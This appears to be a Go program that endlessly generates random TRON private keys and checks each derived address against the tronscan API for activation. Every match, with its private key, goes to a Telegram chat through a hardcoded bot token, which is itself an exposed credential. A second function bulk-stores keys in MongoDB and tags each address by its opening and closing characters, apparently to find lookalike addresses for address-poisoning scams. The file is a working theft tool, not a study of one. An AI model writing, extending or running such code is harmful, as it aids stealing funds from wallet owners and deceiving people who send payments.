package main

import (
	"context"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"github.com/btcsuite/btcd/btcec"
	"github.com/fbsobreira/gotron-sdk/pkg/address"
	"go.mongodb.org/mongo-driver/mongo"
	"io/ioutil"
	"net/http"
	"usdt/scraping/tg"
	"usdt/utils"
)

type Addr struct {
	Address    string `json:"address"`
	PrivateKey string `json:"private_key"`
}

type Data struct {
	Activated bool `json:"activated"`
}

func main() {
	//	 查询账号是否激活
	QueryAccountActive()
}

func QueryAccountActive() {
	addrChan := make(chan Addr, 100)

	// 循环15次
	for i := 0; i < 2; i++ {
		go CheckAddress(addrChan)
	}

	for {
		wif, addr := GenerateKey()
		addrChan <- Addr{
			Address:    addr,
			PrivateKey: wif,
		}
	}
}

// CheckAddress 校验地址是否有效
func CheckAddress(addrChan chan Addr) {
	for {
		addr := <-addrChan

		// get请求 使用用户地址请求用户数据
		url := fmt.Sprintf("https://apilist.tronscanapi.com/api/accountv2?address=%v", addr.Address)
		// 发送请求
		resp, err := http.Get(url)
		if err != nil {
			fmt.Println("http get err: ", err)
			return
		}
		// 读取请求数据
		body, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			fmt.Println("read body err: ", err)
			resp.Body.Close()
			return
		}
		data := Data{}
		// 解析json数据
		err = json.Unmarshal(body, &data)
		if err != nil {
			fmt.Println("body: ", string(body))
			fmt.Println("json unmarshal err: ", err)
			resp.Body.Close()
			continue
		}
		// 判断是否激活
		if data.Activated {
			// 调用小飞机通知接口
			telegram := tg.TG{
				Url: "https://api.telegram.org/bot5780070107:AAFtrN_OJtOzD8J1E5DyjXza-U40vB_3QGA/sendMessage",
			}
			tgTxt := map[string]interface{}{
				"chat_id": "-833718329",
				"text":    fmt.Sprintf("监测到已激活账号 \n地址：%v\n密钥：%v\n", addr.Address, addr.PrivateKey),
			}
			err := telegram.SendMsg(tgTxt, nil)
			if err != nil {
				fmt.Printf("Success -> telegram.SendMsg(tgTxt, nil) 错误：%v\n", err)
			}
			fmt.Println("已激活: ", addr.PrivateKey, addr.Address)
			resp.Body.Close()
		} else {
			fmt.Println("未激活: ", addr.Address)
		}

		resp.Body.Close()
	}
}

func GenerateAddress() {
	var (
		client     = utils.GetMgoCli("mongodb://localhost:27017")
		db         *mongo.Database
		collection *mongo.Collection
	)
	//2.选择数据库 my_db
	db = client.Database("addrs")

	//选择表 my_collection
	collection = db.Collection("list")
	collection = collection
	//
	//// Pass these options to the Find method
	//findOptions := options.Find()
	//findOptions.SetLimit(10)
	//filter := bson.D{}
	//filter = append(filter, bson.E{
	//	Key: "public",
	//	//i 表示不区分大小写
	//	Value: bson.M{"$regex": primitive.Regex{Pattern: "^T.*8$", Options: "i"}},
	//})
	//
	//results := make([]map[string]interface{}, 0)
	//
	//find, err := collection.Find(context.Background(), filter, findOptions)
	//for find.Next(context.TODO()) {
	//
	//	// create a value into which the single document can be decoded
	//	var elem map[string]interface{}
	//	err := find.Decode(&elem)
	//	if err != nil {
	//		fmt.Println("err decode")
	//		log.Fatal(err)
	//	}
	//
	//	results = append(results, elem)
	//}
	//
	//fmt.Println(results, len(results))
	//
	//err = find.Close(context.TODO())
	//if err != nil {
	//	return
	//}
	//
	//if err != nil {
	//	fmt.Println(err)
	//	return
	//}
	arr := []interface{}{}
	for {

		wif, addr := GenerateKey()
		decode, err := utils.Decode(addr)
		if err != nil {
			return
		}
		data := map[string]interface{}{
			"private":   wif,
			"public":    addr,
			"hexPublic": decode,
			"tags": []string{
				fmt.Sprintf("%v%v", addr[:5], addr[len(addr)-5:]),
				addr[len(addr)-5:],
				addr[len(addr)-4:],
			},
		}
		arr = append(arr, data)
		// 当arr数量到1000时，插入数据库
		if len(arr) == 10000 {
			_, err := collection.InsertMany(context.Background(), arr)
			if err != nil {
				fmt.Println("InsertMany err: ", err)
				continue
			}

			//_, err = collection.Indexes().CreateOne(context.TODO(), mongo.IndexModel{
			//	Keys: map[string]int{
			//		"tags": 1,
			//	},
			//})
			//if err != nil {
			//	fmt.Println("CreateOne err: ", err)
			//	continue
			//}

			arr = []interface{}{}
		}
	}
}

func GenerateKey() (wif string, addr string) {
	pri, err := btcec.NewPrivateKey(btcec.S256())
	if err != nil {
		return "", ""
	}
	if len(pri.D.Bytes()) != 32 {
		for {
			pri, err = btcec.NewPrivateKey(btcec.S256())
			if err != nil {
				continue
			}
			if len(pri.D.Bytes()) == 32 {
				break
			}
		}
	}

	addr = address.PubkeyToAddress(pri.ToECDSA().PublicKey).String()
	wif = hex.EncodeToString(pri.D.Bytes())
	return
}

// HashToUint100 hash % 100
func HashToUint100(hash []byte) uint32 {
	var sum uint32
	for _, b := range hash {
		sum += uint32(b)
	}
	return sum % 100
}
